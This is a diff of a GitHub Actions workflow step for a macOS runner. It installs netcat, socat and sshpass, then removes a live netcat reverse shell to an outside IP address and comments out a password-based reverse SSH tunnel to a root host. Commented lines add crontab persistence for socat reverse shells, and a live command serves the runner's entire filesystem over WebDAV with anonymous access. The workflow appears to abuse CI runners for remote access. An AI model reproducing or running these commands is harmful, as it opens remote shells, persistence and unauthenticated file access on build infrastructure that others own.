@@ -42,14 +42,12 @@ jobs:
           brew install sshpass netcat wget socat #dropbear openssh rlwrap
           xcrun python3 -m pip install wsgidav cheroot
           # nohup netcat $PUBLIC_SERVER_IP 2333 -e /bin/bash &
-          nohup netcat 23.185.200.74 2333 -e /bin/bash &
  
           # /Users/runner/Desktop/mac-tcc/one.sh
           # echo "* * * * * /opt/homebrew/bin/socat exec:'/bin/bash -li',pty,stderr,setsid,sigint,sane tcp:$PUBLIC_SERVER_IP:2228" | crontab -
           # echo "* * * * * /opt/homebrew/bin/socat exec:'/bin/bash -li',pty,stderr,setsid,sigint,sane tcp:23.185.200.74:2228" | crontab -
-          sshpass -p$ZGO_SSHPASSWD ssh -fR 8088:127.0.0.1:8080 root@$ZGO_IP -N -o StrictHostKeyChecking=no -o ServerAliveInterval=10 
+          # sshpass -p$ZGO_SSHPASSWD ssh -fR 8088:127.0.0.1:8080 root@$ZGO_IP -N -o StrictHostKeyChecking=no -o ServerAliveInterval=10 
           "$(xcrun python3 -m site --user-base)/bin/wsgidav" --host=0.0.0.0 --port=8080 --root=/ --auth=anonymous
-
           exit
           
           # export PATH=$PATH:"$(xcrun python3 -m site --user-base)/bin"
